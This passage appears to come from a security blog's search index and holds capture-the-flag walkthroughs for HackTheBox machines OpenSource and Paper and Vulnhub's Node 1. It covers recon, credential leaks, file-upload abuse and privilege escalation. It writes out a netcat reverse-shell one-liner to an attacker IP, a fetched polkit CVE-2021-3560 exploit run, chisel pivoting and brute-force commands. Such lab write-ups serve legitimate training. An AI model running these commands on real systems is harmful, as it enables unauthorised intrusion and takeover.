/tmp/iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf michael@trick:/tmp$ ./script.sh rm: remove write-protected regular file &#39;/etc/fail2ban/action.d/iptables-multiport.conf&#39;? yes michael@trick:/tmp$ Restart fail2ban michael@trick:/tmp$ sudo /etc/init.d/fail2ban restart[ ok ] Restarting fail2ban (via systemctl): fail2ban.service. Bruteforce SSH ┌──(root💀kali)-[~/htb/trick/10.10.11.166]└─# hydra -e nsr -P /usr/share/wordlists/rockyou.txt ssh://10.10.11.166 -VI Root obtained Proceed to root, copy its id_rsa &amp;amp; SSH into root" }, { "title": "HackTheBox - OpenSource", "url": "/posts/OpenSource/", "categories": "HackTheBox, HackTheBox - Linux", "tags": "linux-priv-esc/sudo/gtfo-bin, exploit/file-upload-bypass", "date": "2022-06-22 00:00:00 +0800", "snippet": "OverviewThis machine is hosting a webpage that allows user to test a file upload web application and download its source code. However, the source code is archived together with a directory .git, revealing user credentials.Also, after analzying the source code, there is a way to exploit the file upload application due to the lack of/insufficient user input sanitization. The exploit is done by adding a remote code execution functionality into views.py from the source code and replacing it w/ the webpage’s via the file upload test instance, allowing us to obtain a shell.For the privilege escalation part, we have to escalate our privileges twice, to Dev01 and to root. The initial shell we obtained is in a docker environment, and there exists a internal service on port 3000. Through chisel we are able to escape docker environment and access the internal service on port 3000 running gitea. We are able to login to gitea w/ the credentials from earlier (.git directory) and obtain dev01 SSH private keyOn the system, pspy64 revealed that there is a cronjob running as root executing git. Git contains a GTFOBins entry allowing us to privilege escalate to root. Column Details Box Name OpenSource IP 10.10.11.164 Points - Difficulty Easy Creator irogir Release Date 22-May-2022 ReconTCP/80 (HTTP)FFUF200 GET 45l 144w 1563c http://10.10.11.164/console200 GET 9803l 56722w 2489147c http://10.10.11.164/download console downloadTCP/3000 (?) FilteredInitial FootholdTCP/80 (HTTP) - .git Directory Proceed to http://10.10.11.164 We are able download and view the source code by clicking the download button After clicking download, source.zip is downloaded .git could reveal sensitive information View extract and view the contents of source.zip We have knowledge of the app’s directory structure and code We are able to extract additional information from .git directory ┌──(root💀kali)-[~/htb/open_source/10.10.11.164/loot/.git] └─# git branch dev * public ┌──(root💀kali)-[~/htb/open_source/10.10.11.164/loot/.git] └─# git log dev commit c41fedef2ec6df98735c11b2faf1e79ef492a0f3 (dev) Author: gituser &amp;lt;gituser@local&amp;gt; Date: Thu Apr 28 13:47:24 2022 +0200 ease testing commit be4da71987bbbc8fae7c961fb2de01ebd0be1997 Author: gituser &amp;lt;gituser@local&amp;gt; Date: Thu Apr 28 13:46:54 2022 +0200 added gitignore commit a76f8f75f7a4a12b706b0cf9c983796fa1985820 Author: gituser &amp;lt;gituser@local&amp;gt; Date: Thu Apr 28 13:46:16 2022 +0200 updated commit ee9d9f1ef9156c787d53074493e39ae364cd1e05 Author: gituser &amp;lt;gituser@local&amp;gt; Date: Thu Apr 28 13:45:17 2022 +0200 After viewing the commits, commit a76f8f75f7a4a12b706b0cf9c983796fa1985820 contains sensitive information ┌──(root💀kali)-[~/htb/open_source/10.10.11.164/loot/.git] └─# git show a76f8f75f7a4a12b706b0cf9c983796fa1985820 commit a76f8f75f7a4a12b706b0cf9c983796fa1985820 Author: gituser &amp;lt;gituser@local&amp;gt; Date: Thu Apr 28 13:46:16 2022 +0200 updated diff --git a/app/.vscode/settings.json b/app/.vscode/settings.json new file mode 100644 index 0000000..5975e3f --- /dev/null +++ b/app/.vscode/settings.json @@ -0,0 +1,5 @@ +{ + &quot;python.pythonPath&quot;: &quot;/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python&quot;, + &quot;http.proxy&quot;: &quot;http://dev01:Soulless_Developer#2022@10.10.10.128:5187/&quot;, + &quot;http.proxyStrictSSL&quot;: false +} diff --git a/app/app/views.py b/app/app/views.py index f2744c6..0f3cc37 100644 --- a/app/app/views.py +++ b/app/app/views.py @@ -6,7 +6,17 @@ from flask import render_template, request, send_file from app import app -@app.route(&#39;/&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;]) +@app.route(&#39;/&#39;) +def index(): + return render_template(&#39;index.html&#39;) + + +@app.route(&#39;/download&#39;) +def download(): + return send_file(os.path.join(os.getcwd(), &quot;app&quot;, &quot;static&quot;, &quot;source.zip&quot;)) + + +@app.route(&#39;/upcloud&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;]) def upload_file(): if request.method == &#39;POST&#39;: f = request.files[&#39;file&#39;] @@ -20,4 +30,4 @@ def upload_file(): @app.route(&#39;/uploads/&amp;lt;path:path&amp;gt;&#39;) def send_report(path): path = get_file_name(path) - return send_file(os.path.join(os.getcwd(), &quot;public&quot;, &quot;uploads&quot;, path)) \\ No newline at end of file + return send_file(os.path.join(os.getcwd(), &quot;public&quot;, &quot;uploads&quot;, path)) dev01:Soulless_Developer#2022 Proceed to http://10.10.11.164/upcloud &amp;amp; attempt to upload php-reverse-shell.php However visiting http://10.10.11.164/uploads/php-reverse-shell.php does not execute the reverse shell, instead the file is downloadedTCP/80 (HTTP) - Exploiting Upcloud by analyzing the source code After browsing through the source code, found a way to exploit the application views.py -utils.py ../ is replaced os.path.join is exploitable Source: https://www.geeksforgeeks.org/python-os-path-join-method/ # Python program to explain os.path.join() method # importing os module import os # Path path = &quot;/home&quot; # Join various path components print(os.path.join(path, &quot;User/Desktop&quot;, &quot;file.txt&quot;)) # Path path = &quot;User/Documents&quot; # Join various path components print(os.path.join(path, &quot;/home&quot;, &quot;file.txt&quot;)) # In above example &#39;/home&#39; # represents an absolute path # so all previous components i.e User / Documents # are thrown away and joining continues # from the absolute path component i.e / home. # Path path = &quot;/User&quot; # Join various path components print(os.path.join(path, &quot;Downloads&quot;, &quot;file.txt&quot;, &quot;/home&quot;)) # In above example &#39;/User&#39; and &#39;/home&#39; # both represents an absolute path # but &#39;/home&#39; is the last value # so all previous components before &#39;/home&#39; # will be discarded and joining will # continue from &#39;/home&#39; # Path path = &quot;/home&quot; # Join various path components print(os.path.join(path, &quot;User/Public/&quot;, &quot;Documents&quot;, &quot;&quot;)) # In above example the last # path component is empty # so a directory separator (&#39;/&#39;) # will be put at the end # along with the concatenated value We are able to upload a file wherever we want since we are able to throw away the previous path public &amp;amp; upload For e.g. we wish to upload a file to /home directory, we have to name our file /home/test.txt This GIF recorded after I have obtained a shell (STEP 8) to prove that os.path.join can be exploited this way. We have not obtained a shell at this point. Earlier at we tried to include php-reverse-shell.php but the file is not executed Instead we have to replace views.py with our own version of it that will execute a reverse shell by exploiting os.path.join Add command execute functionality into views.py Replace views.py and test whether our command execution functionality works Server is pinging our machine Reverse shell payload Reverse Shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 10.10.14.82 4444 &amp;gt;/tmp/f URL Encoded rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.82%204444%20%3E%2Ftmp%2Ff Obtain shell Privilege EscalationDev01 - Docker Escape + Pivot After looking through the forums for help, I found out that we have to pivot to another machine in order to access TCP/3000 where it was filtered during our NMAP scan Proceed to /, we are in a docker environment / # ls -la total 72 drwxr-xr-x 1 root root 4096 Jun 22 14:23 . drwxr-xr-x 1 root root 4096 Jun 22 14:23 .. -rwxr-xr-x 1 root root 0 Jun 22 14:23 .dockerenv drwxr-xr-x 1 root root 4096 Jun 22 16:03 app drwxr-xr-x 1 root root 4096 Mar 17 05:52 bin drwxr-xr-x 5 root root 340 Jun 22 14:23 dev drwxr-xr-x 1 root root 4096 Jun 22 14:23 etc drwxr-xr-x 2 root root 4096 May 4 16:35 home drwxr-xr-x 1 root root 4096 May 4 16:35 lib drwxr-xr-x 5 root root 4096 May 4 16:35 media drwxr-xr-x 2 root root 4096 May 4 16:35 mnt drwxr-xr-x 2 root root 4096 May 4 16:35 opt dr-xr-xr-x 275 root root 0 Jun 22 14:23 proc drwx------ 1 root root 4096 May 4 16:35 root drwxr-xr-x 1 root root 4096 Jun 22 14:23 run drwxr-xr-x 1 root root 4096 Mar 17 05:52 sbin drwxr-xr-x 2 root root 4096 May 4 16:35 srv dr-xr-xr-x 13 root root 0 Jun 22 14:23 sys drwxrwxrwt 1 root root 4096 Jun 22 15:53 tmp drwxr-xr-x 1 root root 4096 May 4 16:35 usr drwxr-xr-x 1 root root 4096 May 4 16:35 var Find out the IP address of the machine we just compromised /app # ifconfig eth0 Link encap:Ethernet HWaddr 02:42:AC:11:00:02 inet addr:172.17.0.2 Bcast:172.17.255.255 Mask:255.255.0.0 UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:15434 errors:0 dropped:0 overruns:0 frame:0 TX packets:10755 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:17808811 (16.9 MiB) TX bytes:9245580 (8.8 MiB) lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 UP LOOPBACK RUNNING MTU:65536 Metric:1 RX packets:2354 errors:0 dropped:0 overruns:0 frame:0 TX packets:2354 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:195576 (190.9 KiB) TX bytes:195576 (190.9 KiB) /app # Some information about docker escape https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd The IP address of the docker container is 172.17.0.2 and the host machine mostly creates an interface that acts as a gateway for the Docker network. And, generally, the first IP address of the range is used for that i.e. 172.17.0.1 in this case. We are trying to pivot into the actual machine, so instead of using IP 172.17.0.2, we use 172.17.0.1, as the docker container 172.17.0.2 is unable to communicate with our Kali machine directly. (Im not very sure about this) Use chisel to pivot Kali ┌──(root💀kali)-[~/tools/chisel] └─# chisel server --reverse --port 1337 Target /app # ./chiselLinux64 client 10.10.14.16:1337 R:8888:172.17.0.1:3000 &amp;amp; Access the newly opened port Found a familiar username Earlier, we found credentials for user dev01 dev01:Soulless_Developer#2022 Successfully login Found SSH private key SSH w/ found private key ┌──(root💀kali)-[~/htb/open_source]└─# mv id_rsa.txt id_rsa┌──(root💀kali)-[~/htb/open_source]└─# ssh -i id_rsa dev01@10.10.11.164 Root - Via Cronjob Ran linpeas, did not find any vulnerabilities to exploit Ran pspy64 to sniff root processes, found an interesting process that is executed periodically Our current user dev01 has the git directory in his home directory, we are able to edit files in it Git has a GTFO entry When git is run by a superuser, it does not drop elevated privileges Since git commit is running periodically, we are able to create pre-commit to spawn a root shell pre-commit is executed everytime commit is run https://www.atlassian.com/git/tutorials/git-hooks Create pre-commit and make it executable dev01@opensource:~/.git/hooks$ chmod +x pre-commit Wait for cronjob to execute Root obtained Cronjob that was running root@opensource:~# crontab -l # Edit this file to introduce tasks to be run by cron. # # Each task to run has to be defined through a single line # indicating with different fields when the task will be run # and what command to run for the task # # To define the time you can provide concrete values for # minute (m), hour (h), day of month (dom), month (mon), # and day of week (dow) or use &#39;*&#39; in these fields (for &#39;any&#39;).# # Notice that tasks will be started based on the cron&#39;s system # daemon&#39;s notion of time and timezones. # # Output of the crontab jobs (including errors) is sent through # email to the user the crontab file belongs to (unless redirected). # # For example, you can run a backup of all your user accounts # at 5 a.m every week with: # 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/ # # For more information see the manual pages of crontab(5) and cron(8) # # m h dom mon dow command @reboot sleep 15 ; /root/meta/start.sh * * * * * /usr/local/bin/git-sync */2 * * * * /root/meta/app/clean.sh */2 * * * * cp /root/config /home/dev01/.git/config root@opensource:~# /usr/local/bin/git-sync Changes detected, pushing.. cp: cannot create regular file &#39;/tmp/rootbash&#39;: Text file busy ^C root@opensource:~# " }, { "title": "HackTheBox - Paper", "url": "/posts/Paper/", "categories": "HackTheBox, HackTheBox - Linux", "tags": "exploit/file-inclusion/lfi, tcp/80-http/cms/wordpress", "date": "2022-06-17 00:00:00 +0800", "snippet": "OverviewThis machine begins w/ a wordpress 5.2.3 exploit, allowing us to view private post w/o being authenticated, revealing a subdomain chat.office.paper.A chatbot is running on chat.office.paper that is susceptible to local file inclusion and remote code execution, allowing us to obtain user credentials/a shell.On the system, a critical vulnerability CVE-2021-3560 exists, allowing us to privilege escalate to root. Column Details Box Name Paper IP 10.10.11.143 Points - Difficulty Easy Creator secnigma Release Date 06-Feb-2022 ReconTCP/80 (HTTP)FFUF No files enumeratedInitial FootholdTCP/80 (HTTP) - Wordpress No files enumerated by fuzzing Intercept w/ burpsuite to look for hints/clues office.paper X-Backend-Server x-backend-server header is used to return the name of the back end webserver that may sit behind load balancer server. Add office.paper to /etc/hosts Proceed to http://office.paper Running wordpress View posts, it could give us hints/clues on how to proceed Feeling Alone! There are secret content from drafts Enumerate users in wordpress wpscan --no-update --disable-tls-checks --url http://office.paper -e u -f cli-no-color 2&amp;gt;&amp;amp;1 | tee &quot;/root/htb/paper/10.10.11.143/scans/tcp80/tcp_80_http_wp_user_enum.txt&quot; prisonmike nick creeedthoughts Enumerate all wordpress plugins aggressively wpscan --no-update --disable-tls-checks --plugins-detection aggressive --plugins-version-detection aggressive --url http://office.paper -e ap -f cli-no-color 2&amp;gt;&amp;amp;1 | tee &quot;/root/htb/paper/10.10.11.143/scans/tcp80/tcp_80_http_wp_plugin.txt&quot; Unable to find an exploit Attempt to bruteforce the users, failed Found an exploit for wordpress 5.2.3 Exploit Title Path WordPress Core &amp;lt; 5.2.3 - Viewing Unauthenticated/Password/Private Posts multiple/webapps/47690.md Exploit wordpress 5.2.3 to view private posts # Add ?static=1 http://office.paper/?static=1 chat.office.paper Add chat.office.paper to /etc/hostsExploiting the chatbot (Recyclops) Proceed to http://chat.office.paper/register/8qozr226AhkCHZdyY and create a user After creating proceed to General Chat There is a bot called recyclops, users are able to ask questions Before proceeding, find out more about Rocketchat Build your own bot Hubot After reading through the articles, we know that .env contains credentials View files in sales directory Attempt LFI View files in current directory Files in sale &amp;amp; sale_2 does not contain any interesting information View files in previous directory Found a few interesting directories ssh hubot View files in .ssh No files View files in hubot View .env recyclops:Queenofblad3s!23 TCP/22 (SSH) SSH w/ recyclops:Queenofblad3s!23 Failed Since we saw user.txt in dwight’s home directory, try to login w/ dwight:Queenofblad3s!23 User Flag [dwight@paper ~]$ cat user.txt c12e490e069d445a4aa1e9c0b1fc19e6 Privilege EscalationRoot - Via CVE-2021-3560 Run linpeas CVE-2021-3560 Download exploit Run exploit [dwight@paper ~]$ wget 10.10.14.16/CVE-2021-3560.py --2022-06-17 16:24:47-- http://10.10.14.16/CVE-2021-3560.py Connecting to 10.10.14.16:80... connected. HTTP request sent, awaiting response... 200 OK Length: 2434 (2.4K) [text/plain] Saving to: ‘CVE-2021-3560.py’ CVE-2021-3560.py 100%[==============================================&amp;gt;] 2.38K --.-KB/s in 0s 2022-06-17 16:24:47 (169 MB/s) - ‘CVE-2021-3560.py’ saved [2434/2434] [dwight@paper ~]$ python3 CVE-2021-3560.py ************** Exploit: Privilege escalation with polkit - CVE-2021-3560 Exploit code written by Ahmad Almorabea @almorabea Original exploit author: Kevin Backhouse For more details check this out: https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/ ************** [+] Starting the Exploit id: ‘ahmed’: no such user id: ‘ahmed’: no such user id: ‘ahmed’: no such user id: ‘ahmed’: no such user id: ‘ahmed’: no such user id: ‘ahmed’: no such user id: ‘ahmed’: no such user id: ‘ahmed’: no such user id: ‘ahmed’: no such user id: ‘ahmed’: no such user id: ‘ahmed’: no such user id: ‘ahmed’: no such user id: ‘ahmed’: no such user id: ‘ahmed’: no such user id: ‘ahmed’: no such user id: ‘ahmed’: no such user id: ‘ahmed’: no such user id: ‘ahmed’: no such user id: ‘ahmed’: no such user id: ‘ahmed’: no such user id: ‘ahmed’: no such user id: ‘ahmed’: no such user id: ‘ahmed’: no such user id: ‘ahmed’: no such user id: ‘ahmed’: no such user Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required id: ‘ahmed’: no such user id: ‘ahmed’: no such user id: ‘ahmed’: no such user id: ‘ahmed’: no such user id: ‘ahmed’: no such user id: ‘ahmed’: no such user [+] User Created with the name of ahmed [+] Timed out at: 0.00846603546908098 Error org.freedesktop.DBus.Error.UnknownMethod: No such interface &#39;org.freedesktop.Accounts.User&#39; on object at path /org/freedesktop/Accounts/User1005 Error org.freedesktop.DBus.Error.UnknownMethod: No such interface &#39;org.freedesktop.Accounts.User&#39; on object at path /org/freedesktop/Accounts/User1005 Error org.freedesktop.DBus.Error.UnknownMethod: No such interface &#39;org.freedesktop.Accounts.User&#39; on object at path /org/freedesktop/Accounts/User1005 Error org.freedesktop.DBus.Error.UnknownMethod: No such interface &#39;org.freedesktop.Accounts.User&#39; on object at path /org/freedesktop/Accounts/User1005 Error org.freedesktop.DBus.Error.UnknownMethod: No such interface &#39;org.freedesktop.Accounts.User&#39; on object at path /org/freedesktop/Accounts/User1005 [+] Timed out at: 0.007400750549632611 [+] Exploit Completed, Your new user is &#39;Ahmed&#39; just log into it like, &#39;su ahmed&#39;, and then &#39;sudo su&#39; to root We trust you have received the usual lecture from the local System Administrator. It usually boils down to these three things: #1) Respect the privacy of others. #2) Think before you type. #3) With great power comes great responsibility. bash: cannot set terminal process group (69981): Inappropriate ioctl for device bash: no job control in this shell [root@paper dwight]# whoami root [root@paper dwight]# Root Flag [root@paper ~]# cat root.txt db09527a680428d7a411007464b83e7f " }, { "title": "Vulnhub - Node 1", "url": "/posts/Node-1/", "categories": "Vulnhub, Linux", "tags": "exploit/command-injection, linux-priv-esc/linux-creds-found", "date": "2022-03-13 00:00:00 +0800", "snippet": "ReconTCP/3000 (HTTP)FFUF┌──(root💀kali)-[~/vulnHub/Node-1]└─# ffuf -u http://$ip:3000/FUZZ -w /usr/share/wordlists/dirb/common.txt -e &#39;.html,.txt,.php,.cgi,.log&#39; -fw 727 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://192.168.110.40:3000/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Extensions : .html .txt .php .cgi .log :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response words: 727________________________________________________assets [Status: 301, Size: 171, Words: 7, Lines: 10]uploads [Status: 301, Size: 173, Words: 7, Lines: 10]vendor [Status: 301, Size: 171, Words: 7, Lines: 10]:: Progress: [27690/27690] :: Job [1/1] :: 1985 req/sec :: Duration: [0:00:19] :: Errors: 0 ::Initial FootholdTCP/3000 (HTTP) - Insecure Web Application Proceed to the website There is a login page Proceed to /login, determine if page is susceptible to SQLi Auth Bypass Failed Intercept w/ burpsuite /api/session/authenticate is queried JSON Request View files that are queried on this website Inspect Element -&amp;gt; Sources -&amp;gt; js -&amp;gt; app -&amp;gt; controllers Files in /api directory is being queried Enumerate files/dirs in /api ┌──(root💀kali)-[~/vulnHub/Node-1] └─# ffuf -u http://$ip:3000/api/FUZZ -w /usr/share/wordlists/dirb/common.txt -e &#39;.html,.txt,.php,.cgi,.log&#39; -fw 727 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &amp;lt;3 ________________________________________________ :: Method : GET :: URL : http://192.168.110.40:3000/api/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/common.txt :: Extensions : .html .txt .php .cgi .log :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response words: 727 ________________________________________________ session [Status: 200, Size: 23, Words: 1, Lines: 1] users [Status: 200, Size: 611, Words: 1, Lines: 1] :: Progress: [27690/27690] :: Job [1/1] :: 1191 req/sec :: Duration: [0:00:17] :: Errors: 0 :: View enumerated directories session users ┌──(root💀kali)-[~/vulnHub/Node-1] └─# curl -s $ip:3000/api/users | python -m json.tool [ { &quot;_id&quot;: &quot;59a7365b98aa325cc03ee51c&quot;, &quot;is_admin&quot;: true, &quot;password&quot;: &quot;dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af&quot;, &quot;username&quot;: &quot;myP14ceAdm1nAcc0uNT&quot; }, { &quot;_id&quot;: &quot;59a7368398aa325cc03ee51d&quot;, &quot;is_admin&quot;: false, &quot;password&quot;: &quot;f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240&quot;, &quot;username&quot;: &quot;tom&quot; }, { &quot;_id&quot;: &quot;59a7368e98aa325cc03ee51e&quot;, &quot;is_admin&quot;: false, &quot;password&quot;: &quot;de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73&quot;, &quot;username&quot;: &quot;mark&quot; }, { &quot;_id&quot;: &quot;59aa9781cced6f1d1490fce9&quot;, &quot;is_admin&quot;: false, &quot;password&quot;: &quot;5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0&quot;, &quot;username&quot;: &quot;rastating&quot; } ] Credentials obtained Extract usernames, passwords ┌──(root💀kali)-[~/vulnHub/Node-1] └─# curl -s $ip:3000/api/users | python -m json.tool | grep pass | cut -d &#39;:&#39; -f2 | sed &#39;s/\\&quot;,//g&#39; | cut -d &#39;&quot;&#39; -f2 |tee hashes.txt dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240 de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73 5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0 ┌──(root💀kali)-[~/vulnHub/Node-1] └─# curl -s $ip:3000/api/users | python -m json.tool | grep user | cut -d &#39;:&#39; -f2 | sed &#39;s/\\&quot;,//g&#39; | cut -d &#39;&quot;&#39; -f2 |tee usernames myP14ceAdm1nAcc0uNT tom mark rastating Crack hashes ┌──(root💀kali)-[~/vulnHub/Node-1] └─# hashcat -a 0 -m 1400 hashes.txt /usr/share/wordlists/rockyou.txt --show dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af:manchester f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240:spongebob de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73:snowflake ┌──(root💀kali)-[~/vulnHub/Node-1] └─# hashcat -a 0 -m 1400 hashes.txt /usr/share/wordlists/rockyou.txt --show | cut -d &#39;:&#39; -f2 | tee passwords.txt manchester spongebob snowflake ┌──(root💀kali)-[~/vulnHub/Node-1/192.168.110.40/exploit] └─# paste -d &#39;:&#39; usernames passwords.txt | tee hydra_creds.txt myP14ceAdm1nAcc0uNT:manchester tom:spongebob mark:snowflake rastating: TCP/22 (SSH) - Bruteforce Tried to SSH w/ our creds, failed ┌──(root💀kali)-[~/vulnHub/Node-1/192.168.110.40/exploit] └─# hydra -C hydra_creds.txt -e nsr ssh://$ip Hydra v9.2 (c) 2021 by van Hauser/THC &amp;amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway). Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-03-13 18:29:24 [WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4 [DATA] max 16 tasks per 1 server, overall 16 tasks, 16 login tries, ~1 try per task [DATA] attacking ssh://192.168.110.40:22/ 1 of 1 target completed, 0 valid password found Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-03-13 18:29:26 TCP/3000 (HTTP) Login into web application w/ myP14ceAdm1nAcc0uNT:manchester &amp;amp; download Backup Only myP14ceAdm1nAcc0uNT:manchester is an admin account, the rest are ordinary accounts Analyze myplace.backup Find out what kind of file it is ┌──(root💀kali)-[~/vulnHub/Node-1/192.168.110.40/exploit] └─# file myplace.backup myplace.backup: ASCII text, with very long lines (65536), with no line terminators ASCII text View contents .... AAAAAAEAAAAAFBLBQYAAAAAXwNfA3edAQDQ+iUAAAA= = is a padding used in base64 Decode the content of myplace.backup ┌──(root💀kali)-[~/vulnHub/Node-1/192.168.110.40/exploit] └─# cat myplace.backup | base64 -d &amp;gt; decoded_myplace.backup Find out what kind of file it is ┌──(root💀kali)-[~/vulnHub/Node-1/192.168.110.40/exploit] └─# file decoded_myplace.backup decoded_myplace.backup: Zip archive data, at least v1.0 to extract, compression method=store .zip file Extract it ┌──(root💀kali)-[~/vulnHub/Node-1/192.168.110.40/exploit] └─# mv decoded_myplace.backup decoded_myplace.zip ┌──(root💀kali)-[~/vulnHub/Node-1/192.168.110.40/exploit] └─# unzip decoded_myplace.zip Archive: decoded_myplace.zip creating: var/www/myplace/ [decoded_myplace.zip] var/www/myplace/package-lock.json password: Password protected Crack zip file Crack zip file w/ fcrackzip ┌──(root💀kali)-[~/vulnHub/Node-1/192.168.110.40/exploit] └─# fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt decoded_myplace.zip &#39;var/www/myplace/&#39; is not encrypted, skipping found file &#39;var/www/myplace/package-lock.json&#39;, (size cp/uc 4404/ 21264, flags 9, chk 0145) &#39;var/www/myplace/node_modules/&#39; is not encrypted, skipping &#39;var/www/myplace/node_modules/serve-static/&#39; is not encrypted, skipping found file &#39;var/www/myplace/node_modules/serve-static/README.md&#39;, (size cp/uc 2733/ 7508, flags 9, chk 1223) found file &#39;var/www/myplace/node_modules/serve-static/index.js&#39;, (size cp/uc 1640/ 4533, flags 9, chk b964) found file &#39;var/www/myplace/node_modules/serve-static/LICENSE&#39;, (size cp/uc 697/ 1189, flags 9, chk 1020) found file &#39;var/www/myplace/node_modules/serve-static/HISTORY.md&#39;, (size cp/uc 2625/ 8504, flags 9, chk 35bd) found file &#39;var/www/myplace/node_modules/serve-static/package.json&#39;, (size cp/uc 868/ 2175, flags 9, chk 0145) &#39;var/www/myplace/node_modules/utils-merge/&#39; is not encrypted, skipping found file &#39;var/www/myplace/node_modules/utils-merge/README.md&#39;, (size cp/uc 344/ 634, flags 9, chk 9f17) found file &#39;var/www/myplace/node_modules/utils-merge/index.js&#39;, (size cp/uc 219/ 381, flags 9, chk 9e03) 8 file maximum reached, skipping further files PASSWORD FOUND!!!!: pw == magicword Unzip decoded_myplace.zip ┌──(root💀kali)-[~/vulnHub/Node-1/192.168.110.40/exploit] └─# unzip decoded_myplace.zip Archive: decoded_myplace.zip creating: var/www/myplace/ [decoded_myplace.zip] var/www/myplace/package-lock.json password: magicword /var contains the files of the entire web application After browsing through the files, SSH credentials in app.js MongoDB database mark:5AYRft73VtFpc84k TCP/22 (SSH) SSH w/ mark:5AYRft73VtFpc84k Privilege EscalationTom - Via Insecure Application View files in Tom’s home directory mark@node:/home/tom$ ls -la total 40 drwxr-xr-x 6 root root 4096 Sep 3 2017 . drwxr-xr-x 5 root root 4096 Aug 31 2017 .. -rw-r--r-- 1 root root 220 Aug 29 2017 .bash_logout -rw-r--r-- 1 root root 3771 Aug 29 2017 .bashrc drwx------ 2 root root 4096 Aug 29 2017 .cache drwxr-xr-x 3 root root 4096 Aug 30 2017 .config -rw-r----- 1 root root 0 Sep 3 2017 .dbshell -rwxr-xr-x 1 root root 0 Aug 30 2017 .mongorc.js drwxrwxr-x 2 root root 4096 Aug 29 2017 .nano drwxr-xr-x 5 root root 4096 Aug 31 2017 .npm -rw-r--r-- 1 root root 655 Aug 29 2017 .profile -rw-r----- 1 root tom 33 Sep 3 2017 user.txt mark@node:/home/tom$ User Flag is there, we have to privilege escalate to Tom. Linpeas /usr/bin/node /var/scheduler/app.js Unknown application running /usr/bin/node /var/www/myplace/app.js Web application currently running View contents of /var/scheduler/app.js mark@node:/home/tom$ cat /var/scheduler/app.js const exec = require(&#39;child_process&#39;).exec; const MongoClient = require(&#39;mongodb&#39;).MongoClient; const ObjectID = require(&#39;mongodb&#39;).ObjectID; const url = &#39;mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&amp;amp;authSource=scheduler&#39;; MongoClient.connect(url, function(error, db) { if (error || !db) { console.log(&#39;[!] Failed to connect to mongodb&#39;); return; } setInterval(function () { db.collection(&#39;tasks&#39;).find().toArray(function (error, docs) { if (!error &amp;amp;&amp;amp; docs) { docs.forEach(function (doc) { if (doc) { console.log(&#39;Executing task &#39; + doc._id + &#39;...&#39;); exec(doc.cmd); db.collection(&#39;tasks&#39;).deleteOne({ _id: new ObjectID(doc._id) }); } }); } else if (error) { console.log(&#39;Something went wrong: &#39; + error); } }); }, 30000); }); Scheduler app is connecting to the MongoDB database w/ Mark’s credentials periodically, Retreiving a value called cmd from the task collection, Executing cmd and Deleting the cmd value from task collection after executing it Since this application is started by Tom, the command executed will be executed as Tom allowing us to privilege escalate. To exploit this, we add a value into cmd from task collection, that will execute a reverse shell, allowing us privilege escalate to Tom Exploiting the vulnerability Connect to MongoDB w/ Mark’s credentials mark@node:/home/tom$ mongo -u mark -p 5AYRft73VtFpc84k scheduler 